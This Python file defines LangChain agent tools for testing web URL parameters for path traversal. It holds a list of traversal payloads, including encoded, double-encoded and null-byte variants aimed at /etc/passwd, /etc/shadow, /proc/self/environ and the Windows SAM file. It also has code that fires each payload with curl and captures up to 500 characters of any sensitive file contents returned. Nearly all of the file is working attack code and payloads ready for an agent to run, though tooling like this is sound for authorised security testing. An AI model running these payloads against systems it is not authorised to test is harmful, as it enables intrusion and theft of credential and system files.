"""
Path Traversal / Directory Traversal Tester
Tests for path traversal vulnerabilities across multiple file systems
"""

from langchain.tools import tool
import subprocess
import re
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


PATH_TRAVERSAL_PAYLOADS = {
    # Basic traversal
    "../../../etc/passwd": "Basic Unix traversal",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts": "Basic Windows traversal",
    
    # URL encoded
    "..%2F..%2F..%2Fetc%2Fpasswd": "URL encoded Unix",
    "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts": "URL encoded Windows",
    
    # Double encoding
    "..%252F..%252F..%252Fetc%252Fpasswd": "Double encoded Unix",
    
    # Unicode encoding
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd": "Unicode encoding",
    
    # Null byte
    "../../../etc/passwd%00.jpg": "Null byte injection",
    
    # Case variation (Windows)
    "..\\..\\..\\WiNdOwS\\sYsTeM32\\drivers\\etc\\hosts": "Case variation",
    
    # Backslash bypass
    "..\\\\..\\\\..\\\\windows\\system32": "Backslash doubling",
    
    # Common sensitive files
    "/etc/shadow": "Unix shadow file",
    "/etc/hosts": "Unix hosts file",
    "/proc/self/environ": "Process environment",
    "C:\\Windows\\System32\\config\\SAM": "Windows SAM",
    "/var/www/html/": "Web root directory",
}


@tool
def test_path_traversal(url: str, param_name: str = None) -> dict:
    """
    Test URL/file parameters for path traversal vulnerabilities
    
    Args:
        url: Target URL with parameter(s) to test
        param_name: Specific parameter name to test (if None, test all)
    
    Returns:
        Dictionary with path traversal findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "payloads_attempted": 0,
        "evidence": []
    }
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    
    if not params:
        findings["error"] = "No URL parameters found"
        return findings
    
    test_params = [param_name] if param_name else list(params.keys())
    sensitive_file_indicators = ["root:", "Administrator", "[boot loader]", "SYSTEM", "SAM"]
    
    for param in test_params:
        if param not in params:
            continue
            
        for payload, description in PATH_TRAVERSAL_PAYLOADS.items():
            findings["payloads_attempted"] += 1
            
            # Replace parameter with traversal payload
            test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params_dict[param] = payload
            
            # Reconstruct URL
            test_query = urlencode(test_params_dict)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "3", test_url],
                    capture_output=True,
                    timeout=5,
                    text=True
                )
                
                response = result.stdout
                
                # Check for sensitive file content
                if any(indicator in response for indicator in sensitive_file_indicators):
                    findings["vulnerable"] = True
                    findings["findings"].append(f"Path traversal: {description} - {payload}")
                    findings["evidence"].append({
                        "payload": payload,
                        "evidence": response[:500]
                    })
                
            except Exception:
                pass
    
    return findings


@tool
def quick_path_traversal_check(url: str) -> dict:
    """Quick path traversal vulnerability screening"""
    return test_path_traversal(url, None)
